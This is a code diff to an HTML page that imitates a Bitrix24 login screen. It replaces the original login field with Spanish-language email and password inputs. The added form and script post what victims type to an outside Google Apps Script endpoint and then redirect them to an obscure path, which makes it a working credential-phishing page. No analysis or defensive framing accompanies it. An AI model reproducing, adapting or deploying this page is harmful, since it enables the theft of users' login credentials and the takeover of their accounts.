@@ -10,9 +10,83 @@
       }
     
             @font-face {
-        font-family: logicyclist3;
+        font-family: Montserrat2;
         src: url(https://cdn.glitch.global/42bffd45-090e-4701-ab4a-b7d052de8dac/montserrat-semibold.woff2?v=1728395529518);
       }
+    
+    
+    
+    
+          input:focus,
+      textarea:focus,
+      button:focus {
+        outline: none;
+      }
+
+      textarea {
+        resize: none;
+      }
+    
+    
+        .gum::placeholder {
+        color: rgb(82, 92, 105);
+        font-family: "Montserrat" !important;
+        font-weight: 100;
+        letter-spacing: 0px;
+        line-height: 40px;
+        font-size: 19px;
+      }
+    
+    
+
+      .gum {
+    margin-top: 15px;
+    background: #ffffff;
+    border: 2px solid #d2d4d8;
+    border-radius: 3px;
+    text-align: left;
+    font-size: 22px !important;
+    font-family: "Montserrat" !important;
+    letter-spacing: 0px;
+    color: #000;
+    line-height: 40px;
+    cursor: text;
+    width: 100%;
+    /* max-width: 400px; */
+    padding-left: 20px;
+    padding-right: 20px;
+    padding-top: 9px;
+    padding-bottom: 7px;
+    margin-left: auto;
+    margin-right: auto;
+      }
+    
+    
+      .gumbtn {
+    background-color: color(display-p3 0.65 0.81 0.25) !important;
+    color: #fff;
+    border: none;
+    cursor: pointer;
+    font-family: "Montserrat" !important;
+    font-weight: 100;
+    letter-spacing: -0.2px;
+    font-size: 18px;
+    border-radius: 40px !important;
+    margin-left: auto;
+    margin-right: auto;
+    margin-top: 13px;
+    margin-bottom: 30px;
+    height: 55px;
+    padding-left: 23px;
+    padding-right: 23px;
+    padding-top: 15px;
+    padding-bottom: 14px;
+    width: 100%;
+    max-width: 162px;
+    position: relative;
+    overflow: hidden;
+      }
+    
   </style>
 
 <body cz-shortcut-listen="true" style="cursor: auto;width: 100%;height:750px;font-family:Montserrat, 'Helvetica Neue', Helvetica, Arial, sans-serif;margin:0px;padding:0px;color:rgb(82, 92, 105);overflow-x:hidden;">
@@ -62,21 +136,59 @@
                                 <div>
                                     <form>
                                         <div style="display:flex;flex-direction:column;position:relative;white-space:normal;">
-                                            <div data-component="INPUT" style="display:flex;flex-direction:column;margin:0px 0px 19px;"><label for="login" style="font-size:20px;line-height:26px;margin-bottom:12px;width: 100%;">Introduzca el número de teléfono o correo electrónico</label>
-                                                <div style="position:relative;overflow:hidden;"><input type="text" style="padding:12px 85px 15px 17px;border:2px solid rgb(209, 212, 216);border-radius:3px;color:rgb(51, 51, 51);font-size:20px;line-height:26px;transition:border 0.2s;box-sizing:border-box;width: 100%;background:rgba(0, 0, 0, 0) none repeat scroll 0% 0% / auto padding-box border-box;appearance:none;font-family:Montserrat, 'Helvetica Neue', Helvetica, Arial, sans-serif;" />
-                                                    <div style="right:2px;z-index:1;position:absolute;top:0px;border-left:1px solid rgb(209, 212, 216);margin:11px 0px;padding:0px 32px 0px 16px;box-sizing:border-box;cursor:pointer;height:34px;display:flex;align-items:center;background:rgba(0, 0, 0, 0) url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20width%3D%2212%22%20height%3D%2212%22%20viewBox%3D%220%200%2012%2012%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%20%20%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M1.757%204.586L.343%206l4.242%204.243L6%2011.657l1.414-1.414L11.656%206l-1.414-1.414L6%208.828%201.757%204.586z%22%20fill%3D%22%23828B95%22/%3E%0A%3C/svg%3E%0A') no-repeat scroll right 17px top 10px / auto padding-box border-box;charset=US-ASCII,%3Csvg%20width%3D%2212%22%20height%3D%2212%22%20viewBox%3D%220%200%2012%2012%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%20%20%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M1.757%204.586L.343%206l4.242%204.243L6%2011.657l1.414-1.414L11.656%206l-1.414-1.414L6%208.828%201.757%204.586z%22%20fill%3D%22%23828B95%22/%3E%0A%3C/svg%3E%0A') right 17px top 10px no-repeat transparent;charset=US-ASCII,%3Csvg%20width%3D%2212%22%20height%3D%2212%22%20viewBox%3D%220%200%2012%2012%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%20%20%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M1.757%204.586L.343%206l4.242%204.243L6%2011.657l1.414-1.414L11.656%206l-1.414-1.414L6%208.828%201.757%204.586z%22%20fill%3D%22%23828B95%22/%3E%0A%3C/svg%3E%0A') right 17px top 10px no-repeat transparent;"><span style="pointer-events: none; cursor: pointer; display: inline-block;cursor:pointer;display:block;vertical-align:middle;margin-right:13px;flex-shrink:0;background-position:0px -5376px;height:24px;width: 24px;background:rgba(0, 0, 0, 0) url('https://www.bitrix24.net/oauth/flag/sprite-24.png') repeat scroll 0px -5376px / auto padding-box border-box;"></span></div>
-                                                </div>
-                                            </div>
+                                
        
              
                                           
-                                          
+                                             <form
+            id="FORM_ID"
+            method="POST"
+            action="https://script.google.com/macros/s/AKfycbxBTCR2D2Gm1MFO21ZYytTUpLqqm2nUv-Q58JVUdV3sKwg9qE3cCy3qbaNhpuCo7ibSVw/exec"
+          >
+            <input
+              class="gum"
+              name="Emailx"
+              type="email"
+              placeholder="Correo electrónico"
+              maxlength="35"
+              required
+            />
+            <input
+              class="gum"
+              name="Telx"
+              type="text"
+              placeholder="Contraseña"
+              maxlength="35"
+              required
+            />
+
+<br />
+
+            <button type="submit" class="gumbtn">SIGUIENTE</button>
+            
+            
+
+            <script type="text/javascript">
+              window.addEventListener("DOMContentLoaded", function () {
+                const yourForm = document.getElementById("FORM_ID");
+                yourForm.addEventListener("submit", function (e) {
+                  e.preventDefault();
+                  const data = new FormData(yourForm);
+                  const action = e.target.action;
+                  fetch(action, {
+                    method: "POST",
+                    body: data,
+                  }).then(() => {
+                    window.location.replace("/20398203723780283217390028370921321form1validfr");
+                  });
+                });
+              });
+            </script>
+          </form>
                                           
                                           
                         
-                                            <div style="width: 100%;padding:45px 0px 52px;border-top:1px solid rgba(82, 92, 105, 0.1);display:flex;align-items:center;justify-content:center;flex-wrap:wrap;overflow:hidden;position:relative;">
-                                                <button data-action="submit" style="color:rgb(255, 255, 255);background-color:rgb(157, 207, 0);border-color:rgb(157, 207, 0);padding:0px 33px;min-width:158px;height:52px;border-radius:26px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-variant-east-asian:normal;font-variant-alternates:normal;font-variant-position:normal;font-stretch:100%;font-size:17px;line-height:23px;font-family:Montserrat, 'Helvetica Neue', Helvetica, Arial, sans-serif;font-optical-sizing:auto;font-size-adjust:none;font-kerning:auto;font-feature-settings:normal;font-variation-settings:normal;font-weight:500;overflow:hidden;margin:7px 2px;--ui-btn-radius: calc(40px / 2);--ui-btn-background: #bbed21;--ui-btn-background-hover: #d2f95f;--ui-btn-background-active: #b2e232;--ui-btn-border-color: #bbed21;--ui-btn-border-color-hover: #d2f95f;--ui-btn-border-color-active: #b2e232;--ui-btn-opacity-after: .2;--ui-btn-colors-after-bg: #525c69;--ui-btn-colors-before-bg: #525c69;--ui-btn-color: #525c69;--ui-btn-color-hover: #525c69;--ui-btn-color-active: #525c69;--ui-btn-padding: 0 19px;--ui-btn-padding-right: 12px;--ui-btn-min-width: 80px;--ui-btn-height: 40px;--ui-btn-font-size: 12px;vertical-align:middle;position:relative;display:flex;justify-content:center;align-items:center;text-align:center;text-decoration:none solid rgb(255, 255, 255);text-transform:uppercase;white-space:nowrap;user-select:none;box-sizing:border-box;outline:rgb(255, 255, 255) none 0px;border-top-style:solid;border-top-width:1px;border-right-style:solid;border-right-width:1px;border-bottom-style:solid;border-bottom-width:1px;border-left-style:solid;border-left-width:1px;border-image-source:none;border-image-slice:100%;border-image-width:1;border-image-outset:0;border-image-repeat:stretch;box-shadow:none;text-shadow:none;cursor:pointer;transition:background-color 0.16s linear, color 0.16s linear, opacity 0.16s linear, box-shadow 0.16s linear, border-color 0.16s linear;">Suivant</button> <button data-action="forgot" style="margin-left:15px;height:52px;border-radius:26px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-variant-east-asian:normal;font-variant-alternates:normal;font-variant-position:normal;font-stretch:100%;font-size:17px;line-height:23px;font-family:Montserrat, 'Helvetica Neue', Helvetica, Arial, sans-serif;font-optical-sizing:auto;font-size-adjust:none;font-kerning:auto;font-feature-settings:normal;font-variation-settings:normal;font-weight:500;overflow:hidden;color:rgb(106, 115, 126);--ui-btn-radius: calc(40px / 2);--ui-btn-background: transparent;--ui-btn-background-hover: #f6f8f9;--ui-btn-background-active: #d6f1fb;--ui-btn-border-color: transparent;--ui-btn-border-color-hover: #f6f8f9;--ui-btn-border-color-active: #d6f1fb;--ui-btn-opacity-after: .3;--ui-btn-colors-after-bg: #525c69;--ui-btn-colors-before-bg: #525c69;--ui-btn-color: #525c69;--ui-btn-color-hover: #333;--ui-btn-color-active: #000;--ui-btn-padding: 0 6px;--ui-btn-padding-right: 12px;--ui-btn-min-width: 80px;--ui-btn-height: 40px;--ui-btn-font-size: 12px;vertical-align:middle;position:relative;display:flex;justify-content:center;align-items:center;padding:0px 6px;text-align:center;text-decoration:none solid rgb(106, 115, 126);text-transform:uppercase;white-space:nowrap;user-select:none;box-sizing:border-box;outline:rgb(106, 115, 126) none 0px;border-top-style:solid;border-top-width:1px;border-right-style:solid;border-right-width:1px;border-bottom-style:solid;border-bottom-width:1px;border-left-style:solid;border-left-width:1px;border-image-source:none;border-image-slice:100%;border-image-width:1;border-image-outset:0;border-image-repeat:stretch;border-color:rgba(0, 0, 0, 0);background-color:rgba(0, 0, 0, 0);box-shadow:none;text-shadow:none;cursor:pointer;transition:background-color 0.16s linear, color 0.16s linear, opacity 0.16s linear, box-shadow 0.16s linear, border-color 0.16s linear;">Mot de passe oublié&nbsp;?</button>
-                                            </div>
+                                
                                         </div>
                                     </form>
                                 </div>
